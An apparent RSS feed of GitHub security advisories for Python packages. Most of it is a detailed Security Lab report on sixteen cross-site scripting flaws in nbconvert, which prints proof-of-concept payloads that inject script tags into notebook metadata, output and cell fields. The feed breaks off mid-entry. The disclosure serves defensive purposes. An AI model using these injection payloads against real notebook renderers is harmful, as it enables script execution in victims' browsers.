<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2022-08-28T18:01:27.183Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune v2.0.2 vulnerable to catastrophic backtracking]]></title>
        <id>https://github.com/advisories/GHSA-fw3v-x4f2-v673</id>
        <link href="https://github.com/advisories/GHSA-fw3v-x4f2-v673"/>
        <updated>2022-08-24T19:20:06.000Z</updated>
        <content type="html"><![CDATA[<p>In Mistune through 2.0.2, support of inline markup is implemented by using regular expressions that can involve a high amount of backtracking on certain edge cases. This behavior is commonly named catastrophic backtracking.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-34749">https://nvd.nist.gov/vuln/detail/CVE-2022-34749</a></li>
<li><a href="https://github.com/lepture/mistune/commit/a6d43215132fe4f3d93f8d7e90ba83b16a0838b2">https://github.com/lepture/mistune/commit/a6d43215132fe4f3d93f8d7e90ba83b16a0838b2</a></li>
<li><a href="https://github.com/lepture/mistune/releases">https://github.com/lepture/mistune/releases</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2022-237.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2022-237.yaml</a></li>
<li><a href="https://github.com/lepture/mistune/issues/314#issuecomment-1223972386">https://github.com/lepture/mistune/issues/314#issuecomment-1223972386</a></li>
<li><a href="https://github.com/lepture/mistune/commit/ca1e7b506850f4e488823fc7338b49a8f9852718">https://github.com/lepture/mistune/commit/ca1e7b506850f4e488823fc7338b49a8f9852718</a></li>
<li><a href="https://github.com/pypa/advisory-database/blob/main/vulns/mistune/PYSEC-2022-237.yaml">https://github.com/pypa/advisory-database/blob/main/vulns/mistune/PYSEC-2022-237.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-fw3v-x4f2-v673">https://github.com/advisories/GHSA-fw3v-x4f2-v673</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fw3v-x4f2-v673</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-07-26T00:00:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbconvert] nbconvert vulnerable to cross-site scripting (XSS) via multiple exploit paths]]></title>
        <id>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</id>
        <link href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq"/>
        <updated>2022-08-23T16:59:20.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-linking to <a href="https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm">https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm</a></p>
<p>Most of the fixes will be in this repo, though, so having it here gives us the private fork to work on patches</p>
<p>Below is currently a duplicate of the original report:</p>
<hr>
<p>Received on <a href="mailto:security@ipython.org">security@ipython.org</a> unedited, I'm not sure if we want to make it separate advisories. </p>
<p>Pasted raw for now, feel free to edit or make separate advisories if you have the rights to. </p>
<h2 id="i-think-the-most-important-is-to-switch-back-from-nbviewerjupyterorg---nbviewerorg-at-the-cloudflare-level-i-guess--there-might-be-fastly-involved-as-well">I think the most important is to switch back from nbviewer.jupyter.org -&gt; nbviewer.org at the cloudflare level I guess ? There might be fastly involved as well.</h2>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="http://example.com">example link to repo</a></li>
<li>Email us at <a href="mailto:example@example.com">example email address</a></li>
</ul>
<hr>
<h1 id="github-security-lab-ghsl-vulnerability-report">GitHub Security Lab (GHSL) Vulnerability Report</h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a href="https://github.com/jupyter/nbconvert">nbconvert</a>.</p>
<p>We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to Cross-Site Scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer) </p>
<h2 id="product">Product</h2>
<p>nbconvert</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/jupyter/nbconvert/releases/tag/5.5.0">v5.5.0</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-1-xss-in-notebookmetadatalanguage_infopygments_lexer-ghsl-2021-1013">Issue 1: XSS in notebook.metadata.language_info.pygments_lexer (<code>GHSL-2021-1013</code>)</h3>
<p>Attacker in control of a notebook can inject arbitrary unescaped HTML in the <code>notebook.metadata.language_info.pygments_lexer</code> field such as the following:</p>
<pre><code class="language-json">"metadata": {
  "language_info": {
   "pygments_lexer": "ipython3-foo\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
  }
}
</code></pre>
<p>This node is read in the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/exporters/html.py#L135-L140"><code>from_notebook_node</code></a> method:</p>
<pre><code class="language-python">def from_notebook_node(self, nb, resources=None, **kw):
  langinfo = nb.metadata.get('language_info', {})
  lexer = langinfo.get('pygments_lexer', langinfo.get('name', None))
  highlight_code = self.filters.get('highlight_code', Highlight2HTML(pygments_lexer=lexer, parent=self))
  self.register_filter('highlight_code', highlight_code)
  return super().from_notebook_node(nb, resources, **kw)
</code></pre>
<p>It is then assigned to <code>language</code> var and passed down to <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L90"><code>_pygments_highlight</code></a></p>
<pre><code class="language-python">from pygments.formatters import LatexFormatter
if not language:
  language=self.pygments_lexer
latex = _pygments_highlight(source, LatexFormatter(), language, metadata)
</code></pre>
<p>In this method, the <code>language</code> variable is <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L56">concatenated to <code>highlight hl-</code> string to conform the <code>cssclass</code></a> passed to the <code>HTMLFormatter</code> constructor:</p>
<pre><code class="language-python">return _pygments_highlight(source if len(source) &gt; 0 else ' ',
  # needed to help post processors:
  HtmlFormatter(cssclass=" highlight hl-"+language),
  language, metadata)
</code></pre>
<p>The <code>cssclass</code> variable is then <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L791">concatenated in the outer div class attribute</a></p>
<pre><code class="language-python">yield 0, ('&lt;div' + (self.cssclass and ' class="%s"' % self.cssclass) + (style and (' style="%s"' % style)) + '&gt;')
</code></pre>
<p>Note that the <code>cssclass</code> variable is also used in other unsafe places such as <a href="https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L711"><code>'&lt;table class="%stable"&gt;' % self.cssclass + filename_tr +</code></a>)</p>
<h3 id="issue-2-xss-in-notebookmetadatatitle-ghsl-2021-1014">Issue 2: XSS in notebook.metadata.title (<code>GHSL-2021-1014</code>)</h3>
<p>The <code>notebook.metadata.title</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>index.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set nb_title = nb.metadata.get('title', '') or resources['metadata']['name'] %}
&lt;title&gt;{{nb_title}}&lt;/title&gt;
</code></pre>
<p>The following <code>notebook.metadata.title</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "title": "TITLE&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-3-xss-in-notebookmetadatawidgetsghsl-2021-1015">Issue 3: XSS in notebook.metadata.widgets(<code>GHSL-2021-1015</code>)</h3>
<p>The <code>notebook.metadata.widgets</code> node is rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13"><code>base.html.j2</code></a> HTML template with no escaping: </p>
<pre><code class="language-html">{% set mimetype = 'application/vnd.jupyter.widget-state+json'%}
{% if mimetype in nb.metadata.get("widgets",{})%}
&lt;script type="{{ mimetype }}"&gt;
{{ nb.metadata.widgets[mimetype] | json_dumps }}
&lt;/script&gt;
{% endif %}
</code></pre>
<p>The following <code>notebook.metadata.widgets</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json"> "metadata": {
  "widgets": {
    "application/vnd.jupyter.widget-state+json": {"foo": "pwntester&lt;/script&gt;&lt;script&gt;alert(1);//"}
  }
 }
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-4-xss-in-notebookcellmetadatatagsghsl-2021-1016">Issue 4: XSS in notebook.cell.metadata.tags(<code>GHSL-2021-1016</code>)</h3>
<p>The <code>notebook.cell.metadata.tags</code> nodes are output directly to the <a href="https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/base/celltags.j2#L4"><code>celltags.j2</code></a> HTML template with no escaping: </p>
<pre><code>{%- macro celltags(cell) -%}
    {% if cell.metadata.tags | length &gt; 0 -%}
        {% for tag in cell.metadata.tags -%}
            {{ ' celltag_' ~ tag -}}
        {%- endfor -%}
    {%- endif %}
{%- endmacro %}
</code></pre>
<p>The following <code>notebook.cell.metadata.tags</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "727d1a5f",
   "metadata": {
     "tags": ["FOO\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div \""]
   },
   "outputs": [],
   "source": []
  }
 ],
</code></pre>
<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>
<h3 id="issue-5-xss-in-output-data-texthtml-cellsghsl-2021-1017">Issue 5: XSS in output data text/html cells(<code>GHSL-2021-1017</code>)</h3>
<p>Using the <code>text/html</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a cell with <code>text/html</code> output executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
        "&lt;script&gt;alert(1)&lt;/script&gt;"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import os; os.system('touch /tmp/pwned')"
   ]
  },
</code></pre>
<h3 id="issue-6-xss-in-output-data-imagesvgxml-cellsghsl-2021-1018">Issue 6: XSS in output data image/svg+xml cells(<code>GHSL-2021-1018</code>)</h3>
<p>Using the <code>image/svg+xml</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["image/svg+xml"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- else %}
{{ output.data['image/svg+xml'] }}
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/svg+xml"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/svg+xml": ["&lt;script&gt;console.log(\"image/svg+xml output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {
     }
    }
</code></pre>
<h3 id="issue-7-xss-in-notebookcelloutputsvg_filenameghsl-2021-1019">Issue 7: XSS in notebook.cell.output.svg_filename(<code>GHSL-2021-1019</code>)</h3>
<p>The <code>cell.output.svg_filename</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{%- if output.svg_filename %}
&lt;img src="{{ output.svg_filename | posix_path }}"&gt;
</code></pre>
<p>The following <code>cell.output.svg_filename</code> node will escape the <code>img</code> tag context and execute arbitrary javascript:</p>
<pre><code class="language-json">  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b72e53fa",
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "svg_filename": "\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
     "data": {
      "image/svg+xml": [""]
     },
     "execution_count": null,
     "metadata": {
     }
    }
   ],
   "source": [""]
  },
</code></pre>
<h3 id="issue-8-xss-in-output-data-textmarkdown-cellsghsl-2021-1020">Issue 8: XSS in output data text/markdown cells(<code>GHSL-2021-1020</code>)</h3>
<p>Using the <code>text/markdown</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["text/markdown"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{{ output.data['text/markdown'] | markdown2html }}
</code></pre>
<p>The following <code>cell.output.data["text/markdown"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "text/markdown": ["&lt;script&gt;console.log(\"text/markdown output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-9-xss-in-output-data-applicationjavascript-cellsghsl-2021-1021">Issue 9: XSS in output data application/javascript cells(<code>GHSL-2021-1021</code>)</h3>
<p>Using the <code>application/javascript</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The <code>cell.output.data["application/javascript"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>&lt;script type="text/javascript"&gt;
var element = document.getElementById('{{ div_id }}');
{{ output.data['application/javascript'] }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/javascript"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "application/javascript": ["console.log(\"application/javascript output\")"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-10-xss-is-outputmetadatafilenames-imagepng-and-imagejpegghsl-2021-1022">Issue 10: XSS is output.metadata.filenames image/png and image/jpeg(<code>GHSL-2021-1022</code>)</h3>
<p>The <code>cell.output.metadata.filenames["images/png"]</code> and <code>cell.metadata.filenames["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- if 'image/png' in output.metadata.get('filenames', {}) %}
&lt;img src="{{ output.metadata.filenames['image/png'] | posix_path }}"
</code></pre>
<p>The following <code>filenames</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": [""]
     },
     "execution_count": null,
     "metadata": {
       "filenames": {
          "image/png": "\"&gt;&lt;script&gt;console.log(\"output.metadata.filenames.image/png injection\")&lt;/script&gt;" 
       }
     }
    }
</code></pre>
<h3 id="issue-11-xss-in-output-data-imagepng-and-imagejpeg-cellsghsl-2021-1023">Issue 11: XSS in output data image/png and image/jpeg cells(<code>GHSL-2021-1023</code>)</h3>
<p>Using the <code>image/png</code> or <code>image/jpeg</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["images/png"]</code> and <code>cell.output.data["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- else %}
&lt;img src="data:image/png;base64,{{ output.data['image/png'] }}"
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/png"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["\"&gt;&lt;script&gt;console.log(\"image/png output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-12-xss-is-outputmetadatawidthheight-imagepng-and-imagejpegghsl-2021-1024">Issue 12: XSS is output.metadata.width/height image/png and image/jpeg(<code>GHSL-2021-1024</code>)</h3>
<p>The <code>cell.output.metadata.width</code> and <code>cell.output.metadata.height</code> nodes of both <code>image/png</code> and <code>image/jpeg</code> cells are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- set width=output | get_metadata('width', 'image/png') -%}
width={{ width }}
{%- set height=output | get_metadata('height', 'image/png') -%}
height={{ height }}
</code></pre>
<p>The following <code>output.metadata.width</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["abcd"]
     },
     "execution_count": null,
     "metadata": {
        "width": "&gt;&lt;script&gt;console.log(\"output.metadata.width png injection\")&lt;/script&gt;"
     }
    }
</code></pre>
<h3 id="issue-13-xss-in-output-data-applicationvndjupyterwidget-statejson-cellsghsl-2021-1025">Issue 13: XSS in output data application/vnd.jupyter.widget-state+json cells(<code>GHSL-2021-1025</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-state+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-state+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-14-xss-in-output-data-applicationvndjupyterwidget-viewjson-cellsghsl-2021-1026">Issue 14: XSS in output data application/vnd.jupyter.widget-view+json cells(<code>GHSL-2021-1026</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-view+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-view+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-15-xss-in-raw-cellsghsl-2021-1027">Issue 15: XSS in raw cells(<code>GHSL-2021-1027</code>)</h3>
<p>Using a <code>raw</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>raw</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "raw",
   "id": "372c2bf1",
   "metadata": {},
   "source": [
    "Payload in raw cell &lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  }
</code></pre>
<h3 id="issue-16-xss-in-markdown-cellsghsl-2021-1028">Issue 16: XSS in markdown cells(<code>GHSL-2021-1028</code>)</h3>
<p>Using a <code>markdown</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>markdown</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "markdown",
   "id": "2d42de4a",
   "metadata": {},
   "source": [
     "&lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  },
</code></pre>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>These vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example <a href="https://nbviewer.jupyter.org">nbviewer</a> is vulnerable to the above mentioned XSS issues:</p>
<ol>
<li>Create Gist with payload. eg:</li>
</ol>
<ul>
<li><code>https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<ol start="2">
<li>Then load gist on nbviewer. eg:</li>
</ol>
<ul>
<li><code>https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<p>Note: response is served with <code>content-security-policy: connect-src 'none';</code></p>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> in any communication regarding these issues.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32862">https://nvd.nist.gov/vuln/detail/CVE-2021-32862</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-10T17:51:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[numpy] Incorrect Comparison in NumPy]]></title>
        <id>https://github.com/advisories/GHSA-fpfv-jqm9-f5jm</id>
        <link href="https://github.com/advisories/GHSA-fpfv-jqm9-f5jm"/>
        <updated>2022-08-22T22:00:05.000Z</updated>
        <content type="html"><![CDATA[<p>Incomplete string comparison in the numpy.core component in NumPy1.9.x, which allows attackers to fail the APIs via constructing specific string objects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34141">https://nvd.nist.gov/vuln/detail/CVE-2021-34141</a></li>
<li><a href="https://github.com/numpy/numpy/issues/18993">https://github.com/numpy/numpy/issues/18993</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://github.com/advisories/GHSA-fpfv-jqm9-f5jm">https://github.com/advisories/GHSA-fpfv-jqm9-f5jm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpfv-jqm9-f5jm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-12-18T00:00:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] OctoPrint 1.7.3 does not have rate limiting on the login page]]></title>
        <id>https://github.com/advisories/GHSA-5w5x-q9p5-9qg3</id>
        <link href="https://github.com/advisories/GHSA-5w5x-q9p5-9qg3"/>
        <updated>2022-08-18T19:18:01.000Z</updated>
        <content type="html"><![CDATA[<p>OctoPrint 1.7.3 and prior does not have rate limiting on the login page, making it possible for attackers to attempt brute force attacks. The severity of this issue is limited by OctoPrint normally running in a restricted LAN. The <code>devel</code> and <code>maintenance</code> branches of the repository have a fix that limits the rate of failed login attempts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-2822">https://nvd.nist.gov/vuln/detail/CVE-2022-2822</a></li>
<li><a href="https://github.com/octoprint/octoprint/commit/82c892ba40b3741d1b7711d949e56af64f5bc2de">https://github.com/octoprint/octoprint/commit/82c892ba40b3741d1b7711d949e56af64f5bc2de</a></li>
<li><a href="https://huntr.dev/bounties/6369f355-e6ef-4469-af75-0f6ff00cde3d">https://huntr.dev/bounties/6369f355-e6ef-4469-af75-0f6ff00cde3d</a></li>
<li><a href="https://github.com/advisories/GHSA-5w5x-q9p5-9qg3">https://github.com/advisories/GHSA-5w5x-q9p5-9qg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5w5x-q9p5-9qg3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-08-16T00:00:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[py-cord] Bots using py-cord as Discord API wrapper are vulnerable to shutdowns through remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-qmhj-m29v-gvmr</id>
        <link href="https://github.com/advisories/GHSA-qmhj-m29v-gvmr"/>
        <updated>2022-08-22T20:10:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>py-cord is a an API wrapper for Discord written in Python. Bots using py-cord version 2.0.0 are vulnerable to remote shutdown if they are added to the server with the <code>application.commands</code> scope without the <code>bot</code> scope. Currently, it appears that all public bots that use slash commands are affected.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched in version 2.0.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are currently no recommended workarounds - please upgrade to a patched version.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/Pycord-Development/pycord/pull/1568">https://github.com/Pycord-Development/pycord/pull/1568</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/Pycord-Development/pycord">our GitHub</a></li>
<li>Email us at <a href="mailto:support@pycord.dev">support@pycord.dev</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
